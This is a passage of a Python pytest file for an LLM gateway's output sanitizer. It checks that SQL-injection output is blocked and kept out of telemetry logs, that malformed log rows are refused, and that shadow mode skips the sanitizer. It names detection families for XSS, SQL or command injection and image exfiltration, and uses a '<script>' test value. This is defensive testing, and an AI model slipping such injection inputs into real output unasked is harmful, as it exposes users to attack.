    app = create_app(settings, upstream=FakeGroq(reply=lambda body: (SQLI, None)).client(), l4=l4_scanner)
    assert_uniform(post(app, headers={"X-Trial-ID": "t-9"}))
    with SQLiteTelemetrySink(settings.LOG_DB_PATH) as reader:
        (row,) = reader.fetch_output_sanitizer()
        (request,) = reader.fetch_requests()
    assert (row["verdict"], row["matched_families"], row["mode"], row["trial_id"], row["egress_variant"]) == (
        "block", ["sqli_cmdi"], "block", "t-9", "X2"
    )
    assert row["sanitizer_version"] == OUTPUT_SANITIZER_VERSION and row["prompt_hash"] == request["prompt_hash"]
    assert SQLI not in json.dumps(row) and request["outcome"] == "Egress-saved"


def _sanitizer_row(**changes: Any) -> dict[str, Any]:
    row = {
        "timestamp_utc": "2026-11-27T00:00:00+00:00", "gateway_mode": "demo", "request_id": "f" * 32,
        "trial_id": None, "prompt_hash": "a" * 64, "response_hash": "b" * 64, "egress_variant": "X2",
        "sanitizer_version": OUTPUT_SANITIZER_VERSION, "mode": "block", "verdict": "block",
        "matched_families": ("xss",), "latency_ms": 0.2, "error_message": None,
    }
    row.update(changes)
    return row


@pytest.mark.parametrize("changes", [
    {"egress_variant": "X0"}, {"verdict": "masked"}, {"matched_families": ("css",)}, {"matched_families": ("xss", "xss")},
    {"matched_families": ("xss", "image_exfil")}, {"verdict": "allow"}, {"verdict": "block", "matched_families": ()},
    {"mode": "strip"}, {"prompt_hash": "nope"}, {"latency_ms": -1.0}, {"content": "<script>"},
])
def test_the_sink_refuses_a_malformed_sanitizer_row(changes):
    with pytest.raises((TypeError, ValueError)):
        output_sanitizer_row(_sanitizer_row(**changes))


def test_the_sink_accepts_a_well_formed_sanitizer_row():
    assert len(output_sanitizer_row(_sanitizer_row())) == 13
    assert output_sanitizer_row(_sanitizer_row(verdict="allow", matched_families=()))[9] == "allow"


# X0 to X3 and the E1 8 x 4 table are unchanged


def test_the_egress_variant_set_is_unchanged():
    assert EGRESS_VARIANTS == ("X0", "X1", "X2", "X3")
    assert typing.get_args(EgressVariantName) == ("X0", "X1", "X2", "X3") == typing.get_args(EgressVariant)


def test_shadow_full_e2e_never_consults_a_sanitizer_even_if_one_is_wired(tmp_path):
    """IP-10: shadow_full_e2e refuses the flag; even a sanitizer forced onto its runtime is never called."""
    from app.pipeline import run_shadow_full_e2e_detail
    from tests.test_pipeline_modes import BENIGN, Stack

    stack = Stack(tmp_path, GATEWAY_MODE="shadow_full_e2e")
    assert stack.app.state.settings.ENABLE_OUTPUT_SANITIZER is False

    async def go(runtime):
        baseline = await run_shadow_full_e2e_detail(runtime, GatewayRequest(user_prompt=BENIGN))
        forced = dataclasses.replace(runtime, output_sanitizer=ExplodingSanitizer())
        again = await run_shadow_full_e2e_detail(forced, GatewayRequest(user_prompt=BENIGN))
        return baseline, again

    baseline, again = stack.run(go)
    shape = lambda d: [(v.variant, v.verdict, v.egress_action, v.content, v.cache_key) for v in d.variants]  # noqa: E731
    assert shape(baseline) == shape(again) and len(baseline.variants) == 4
    assert again.result.sanitizer_log is None
